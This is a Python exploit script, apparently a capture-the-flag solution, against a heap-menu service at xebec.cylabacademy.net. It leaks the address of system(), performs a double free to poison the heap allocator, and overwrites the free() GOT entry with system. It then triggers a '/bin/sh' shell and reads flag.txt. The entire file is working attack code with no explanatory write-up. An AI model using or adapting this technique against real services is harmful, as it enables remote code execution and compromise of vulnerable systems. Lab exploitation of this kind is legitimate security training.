import sys, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "xebec.cylabacademy.net", 48856
FREE_GOT = 0x601f80
SIZE = 0x408
s = socket.create_connection((host, port), timeout=15)
s.settimeout(4)


def drain(t=0.4):
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            break
    return buf


def add(data):
    s.sendall(b"1\n")
    time.sleep(0.2)
    drain()
    s.sendall(str(SIZE).encode() + b"\n")
    time.sleep(0.2)
    drain()
    s.sendall(data)
    time.sleep(0.3)
    return drain()


def rem(idx):
    s.sendall(b"2\n")
    time.sleep(0.2)
    drain()
    s.sendall(str(idx).encode() + b"\n")
    time.sleep(0.3)
    return drain()


print("banniere:", drain()[:150])
s.sendall(b"y\n")
time.sleep(0.4)
lo = b""
t0 = time.time()
while b"0x" not in lo and time.time() - t0 < 6:
    try:
        c = s.recv(4096)
        if not c:
            break
        lo += c
    except socket.timeout:
        break
m = re.search(rb"0x[0-9a-f]+", lo)
print("leak brut:", lo[:120])
if not m:
    sys.exit(1)
system = int(m.group(0), 16)
print("system = 0x%x" % system)
add(b"AAAA")
add(b"/bin/sh\x00")
add(b"BBBB")
print("free0:", rem(0)[-60:])
print("free2:", rem(2)[-60:])
print("free0 bis:", rem(0)[-60:])
print("poison:", add(struct.pack("<Q", FREE_GOT))[-60:])
print("ecriture GOT:", add(struct.pack("<Q", system))[-60:])
print("trigger:", rem(1)[-80:])
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls; echo FIN\n")
res = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        res += c
        if b"FIN" in res:
            break
    except socket.timeout:
        break
s.close()
txt = res.decode("latin-1", "replace")
print("=== resultat ===")
print(txt[:800])
fm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", fm.group(0) if fm else None)
